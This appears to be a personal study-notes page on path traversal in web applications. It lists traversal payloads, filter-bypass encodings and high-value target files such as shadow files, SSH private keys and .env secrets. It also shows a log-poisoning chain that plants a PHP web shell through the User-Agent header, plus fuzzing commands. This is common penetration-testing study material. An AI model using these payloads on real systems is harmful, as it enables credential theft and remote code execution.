# Path Traversal

← [[A01-Broken-Access-Control]]

---

Path traversal (also called directory traversal) lets you read files outside the intended directory by including `../` sequences in file paths. Classic example: reading `/etc/passwd` from a web app that serves files.

---

## The Core Idea

```
App serves files from: /var/www/html/uploads/
Request: GET /download?file=report.pdf
Serves: /var/www/html/uploads/report.pdf

Malicious: GET /download?file=../../../etc/passwd
Serves: /etc/passwd   ← you just read a system file
```

---

## Where to Look

Any feature that reads a file based on user input:
- File download endpoints: `?file=`, `?path=`, `?doc=`, `?filename=`
- Image loading: `?img=`, `?avatar=`, `?photo=`
- Template/include loading: `?template=`, `?page=`, `?include=`
- Log viewers: `?log=`
- Configuration file readers

---

## Basic Payloads

```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../etc/shadow
../../../etc/hosts
../../../proc/self/environ
../../../var/log/apache2/access.log
../../../var/www/html/config.php
../../../home/ubuntu/.ssh/id_rsa
```

**Windows targets:**
```
..\..\..\windows\win.ini
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\Users\Administrator\.ssh\id_rsa
C:\windows\win.ini
```

---

## Filter Bypasses

### Simple Stripping Bypass

If the app strips `../` but doesn't do it recursively:

```
....//....//....//etc/passwd
..././..././..././etc/passwd
```

After stripping `../`: `../../etc/passwd` — still traverses.

### URL Encoding

```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd     (URL encoded)
%2e%2e/%2e%2e/%2e%2e/etc/passwd
..%2f..%2f..%2fetc%2fpasswd
```

### Double URL Encoding

```
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Null Byte (Legacy)

In older PHP apps, a null byte terminates the filename string, bypassing appended extensions:

```
../../../etc/passwd%00.jpg
../../../etc/passwd\0.png
```

### Required Extension Bypass

If the app appends `.php` or `.jpg`:

```
../../../etc/passwd%00.jpg   ← null byte (old PHP)
../../../etc/passwd%00       ← same
../../../etc/passwd/.        ← some edge cases
```

### Absolute Path

Some apps check for `../` but not absolute paths:

```
/etc/passwd
/etc/hosts
C:\windows\win.ini
```

---

## High-Value Target Files

### Linux

```
/etc/passwd              ← usernames, shells
/etc/shadow              ← password hashes (needs root)
/etc/hosts               ← internal hostnames
/etc/hostname            ← server hostname
/proc/self/environ       ← environment variables (may have secrets)
/proc/self/cmdline       ← current process command line
/proc/net/tcp            ← open connections
/var/www/html/config.php ← DB credentials
/var/www/html/.env       ← app secrets
/home/[user]/.ssh/id_rsa ← SSH private key
/var/log/apache2/access.log  ← if you can inject here → log poisoning
/var/log/nginx/access.log
```

### Windows

```
C:\windows\win.ini
C:\windows\system32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config        ← IIS config with credentials
C:\xampp\htdocs\config.php
C:\Users\Administrator\.ssh\id_rsa
```

---

## Path Traversal → RCE (Log Poisoning)

1. Find path traversal that can read log files
2. Inject PHP code into the log (e.g., via User-Agent header)
3. Read the log file via path traversal → PHP executes

```bash
# Step 1: Inject PHP into Apache/nginx log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" https://example.com/

# Step 2: Include the log file via path traversal
GET /download?file=../../../var/log/apache2/access.log&cmd=whoami
```

---

## Automated Testing

```bash
# ffuf with traversal payloads
ffuf -u "https://example.com/download?file=FUZZ" \
  -w ~/wordlists/path-traversal.txt \
  -mc 200 \
  -fs 0

# dotdotpwn — path traversal fuzzer
dotdotpwn -m http -h example.com -U "/download?file=TRAVERSAL" -e .php -k "root:"
```

---

*Related: [[A01-Broken-Access-Control]] | [[A05-Security-Misconfiguration]]*

*Sources: PortSwigger Web Security Academy, OWASP Testing Guide v4, PayloadsAllTheThings*
